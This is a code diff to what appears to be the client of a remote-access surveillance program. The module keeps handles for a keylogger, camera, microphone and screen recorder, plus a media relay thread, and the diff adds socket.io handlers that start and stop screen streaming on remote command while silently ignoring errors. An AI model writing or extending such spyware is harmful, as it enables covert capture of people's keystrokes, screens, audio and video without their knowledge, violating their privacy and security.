@@ -34,6 +34,7 @@ _controller = None
 _recorder = None
 _camera = None
 _mic = None
+_screen_capture = None
 _lock = threading.Lock()
 _screen_recorder = None
 _keylogger = None
@@ -82,12 +83,13 @@ def _media_sender():
 threading.Thread(target=_media_sender, daemon=True, name="relay-media").start()
 
 
-def init(controller_fn, recorder, camera, mic=None):
-    global _controller, _recorder, _camera, _mic
+def init(controller_fn, recorder, camera, mic=None, screen_capture=None):
+    global _controller, _recorder, _camera, _mic, _screen_capture
     _controller = controller_fn
     _recorder = recorder
     _camera = camera
     _mic = mic
+    _screen_capture = screen_capture
 
 
 def _emit(event, data):
@@ -402,6 +404,18 @@ def _make_client():
             sio.emit("import_result", result)
         except Exception as e:
             sio.emit("import_result", {"ok": False, "message": str(e), "_requester": data.get("_requester")})
+
+    @sio.on("start_screen_stream")
+    def _on_start_screen(_data=None):
+        if _screen_capture:
+            try: _screen_capture.start()
+            except Exception: pass
+
+    @sio.on("stop_screen_stream")
+    def _on_stop_screen(_data=None):
+        if _screen_capture:
+            try: _screen_capture.stop()
+            except Exception: pass
 
     @sio.on("camera_on")
     def _on_cam_on(_data=None):
